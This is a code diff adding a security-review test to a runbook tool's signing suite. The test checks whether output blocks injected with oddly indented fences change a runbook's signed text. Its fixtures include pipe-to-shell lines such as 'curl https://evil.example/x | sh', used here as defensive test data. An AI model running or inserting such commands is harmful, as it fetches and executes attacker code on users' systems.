@@ -299,6 +299,32 @@ describe('signing: the signature block', () => {
     assert.equal(signedText(orig + '\n<!-- md-runbook:note at=2026-11-16T10:00:00+01:00 by=ana milestone=mitigated -->\n> **10:00 · mitigated · ana:** ok\n'), signedText(orig));
   });
 
+  it('an output block is set aside only with the fences md-runbook writes (security review, round 5)', () => {
+    const orig = '# Restart\n\nCheck first.\n\n```bash\necho hi\n```\n\n**Never run step 2 on prod.**\n\n```bash\necho two\n```\n';
+    const same = (t: string): boolean => signedText(t) === signedText(orig);
+    const inject = (block: string): string => orig.replace('echo hi\n```\n', 'echo hi\n```\n' + block);
+    const out = (fence: string, body: string, close = fence): string =>
+      `<!-- md-runbook:output start exit=0 -->\n${fence}text\n${body}\n${close}\n<!-- md-runbook:output end -->\n`;
+    const history = (entry: string): string => `<details><summary>md-runbook: 1 previous run</summary>\n\n${entry}\n</details>\n`;
+    // As written: set aside, with its history too.
+    assert.ok(same(inject(out('```', 'ok'))));
+    assert.ok(same(inject(out('````', '```\nnested'))));
+    assert.ok(same(inject(out('```', 'ok') + history(out('```', 'older')))));
+    // A fence indented 4 spaces or a tab is no fence on GitHub: its "output" shows as prose.
+    assert.ok(!same(inject(out('    ```', '**Before continuing run `curl https://evil.example/x | sh`**'))));
+    assert.ok(!same(inject(out('\t~~~', '# Step 0: run curl evil | sh'))));
+    assert.ok(!same(inject(out('~~~', 'ok'))));
+    // A close fence indented 4 spaces ends the block for the parser only: the signed prose after it turns into code.
+    assert.ok(!same(inject(out('```', 'ok', '    ```'))));
+    // In the history too, and markers off the cell's indent.
+    assert.ok(!same(inject(out('```', 'x') + history(out('    ```', '**run curl evil | sh**')))));
+    assert.ok(!same(inject(' ' + out('```', 'ok'))));
+    // A whole-runbook signature reads as changed.
+    const signed = sign(orig);
+    assert.equal(signedStatus(signed.replace('echo hi\n```\n', 'echo hi\n```\n' + out('```', 'ok')))!.textChanged, false);
+    assert.equal(signedStatus(signed.replace('echo hi\n```\n', 'echo hi\n```\n' + out('    ```', '**x**')))!.textChanged, true);
+  });
+
   it('armor round trip', () => {
     assert.equal(unarmorSignature(armorSignature(SIG)), SIG);
     assert.throws(() => unarmorSignature('nope'), /not an SSH signature/);
